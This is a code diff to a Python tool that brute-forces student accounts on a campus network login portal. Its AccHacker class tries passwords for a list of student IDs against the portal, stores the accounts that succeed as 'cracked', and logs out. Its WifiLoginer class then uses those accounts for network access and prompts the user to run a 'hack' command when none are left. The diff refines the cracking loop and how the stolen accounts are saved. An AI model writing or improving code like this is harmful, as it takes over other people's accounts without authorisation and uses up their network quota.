@@ -85,10 +85,7 @@ class AccHacker:
                                                                          time.time() - start), end='', flush=True)
                 if login_res.get('result') == 'success':
                     self.d_accounts["useful_accounts"].append({"stuid": stuid, "pwd": password})
-                    datas = self.l_stuids[cur:]
-                    cur += 1
-                    self._save_accounts(self.d_accounts, datas)
-                    self._logger.info("破解新账户:{}，已存储到本地".format(stuid))
+                    self._logger.info("破解新账户:{}，正存储到本地".format(stuid))
                     requests.get("http://210.77.16.21/eportal/InterFace.do?method=logout")  # 退出当前登录
                     print("破解账号{}耗时:{:.2f}s".format(stuid, time.time() - start))
                     hacked = True
@@ -101,9 +98,13 @@ class AccHacker:
                     time.sleep(1)
                 else:
                     print("出现异常:{}".format(login_res.get('msg')))
+                    break
             if not hacked:
                 self._logger.info("未能破解账户:{}".format(stuid))
                 print("未能破解账号{}耗时:{}s".format(stuid, time.time() - start))
+            datas = self.l_stuids[cur:]
+            cur += 1
+            self._save_accounts(self.d_accounts, datas)
 
     def run(self):
         self._set_info()
@@ -133,7 +134,8 @@ class WifiLoginer:
                 else:
                     if not self.d_accounts["useful_accounts"]:
                         # 所有账户流量都用完了
-                        self._logger.info("没有可用账户!")
+                        self._logger.info("没有可用账户!,请执行python manage.py hack获取可用账号")
+                        exit(401)
 
         except FileNotFoundError:
             self._logger.error("accounts.json文件不存在，请确认在根目录下创建！")
